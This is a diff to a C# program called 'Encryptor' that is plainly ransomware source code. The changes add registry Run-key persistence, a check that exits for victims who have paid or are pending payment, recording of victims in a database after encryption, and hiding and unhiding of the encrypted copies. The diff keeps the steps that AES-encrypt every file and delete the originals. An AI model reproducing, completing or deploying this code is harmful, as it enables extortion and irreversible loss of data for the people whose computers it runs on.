@@ -21,6 +21,7 @@ using System.IO;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Drawing;
+using Microsoft.Win32;
 
 namespace Encryptor
 {
@@ -45,17 +46,25 @@ namespace Encryptor
 		public static void Main(string[] args)
 		{
 			//hideConsole();
+			//writeToRegistry();
 			//waitGivenMinutes(MINUTES_TO_WAIT);
 			//checkSysteInfoForVM();
-			checkInsurance();
+			
+			checkDBStatus();
 
 			AesCryptoServiceProvider aes = createCipher();
 			encryptAllFiles(aes);		
-			DB.addVictimToDB(aes);
 			
 			notifyUser();
 		}
-		
+
+
+		private static void writeToRegistry()
+		{
+			RegistryKey add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+			add.SetValue("WindowsEnc", "\"" + Application.ExecutablePath.ToString() + "\"");
+
+		}
 		
 		
 
@@ -70,7 +79,10 @@ namespace Encryptor
 			toEncrypt = new List<string>();
 			itterate(baseDirectory, aes);
 			encryptToEncryptList(aes);
+			
+			DB.addVictimToDB(aes);
 			deleteUnencrypted();
+			showAllFiles();
 			
 						
 			watch.Stop();
@@ -167,14 +179,20 @@ namespace Encryptor
 		
 		/// <summary>
 		/// This method checks if the user has been attacked before and if he has an insurance then aborts the procecss
+		/// also if the files have already been encrypted and he hasent paied yet we dont want to re-encrypt them 
 		/// </summary>
-		private static void checkInsurance()
+		private static void checkDBStatus()
 		{
 			if (DB.getStatus() == 2)
 			{
 				string message = "Good news! your isnurance paied off, your computer won't be encrypted again";
 				string caption = "Congradulations";
 				MessageBox.Show(message, caption,MessageBoxButtons.OK,MessageBoxIcon.Exclamation);
+				Environment.Exit(0);
+			}
+			else if (DB.getStatus() == -1 || DB.getStatus() == 1)
+			{				
+				Environment.Exit(0);
 			}
 		}
 		
@@ -256,11 +274,15 @@ namespace Encryptor
 			System.Threading.Thread.Sleep(15);
 			var buffer = new byte[65536];
 			File.SetAttributes(filePath, FileAttributes.Normal);
+			//File.SetAttributes(filePath, File.GetAttributes(filePath) | FileAttributes.Hidden);
+
 
 			using (var streamIn = new FileStream(filePath, FileMode.Open,FileAccess.Read))
 			using (var streamOut = new FileStream(filePath + ".enc", FileMode.Create))
 			using (var encrypt = new CryptoStream(streamOut, aes.CreateEncryptor(), CryptoStreamMode.Write))
 			{
+				File.SetAttributes(filePath + ".enc", File.GetAttributes(filePath + ".enc") | FileAttributes.Hidden);
+				
 				int bytesRead;
 				do
 				{
@@ -289,6 +311,21 @@ namespace Encryptor
 					System.Threading.Thread.Sleep(6);
 					//DEBUG: Console.WriteLine("Now Deleting: " + filePath);
 					File.Delete(filePath);
+				}
+				catch
+				{
+				}
+
+			}
+		}
+		
+		private static void showAllFiles()
+		{
+			foreach (var filePath in toEncrypt)
+			{
+				try
+				{
+					File.SetAttributes(filePath + ".enc", FileAttributes.Normal);
 				}
 				catch
 				{
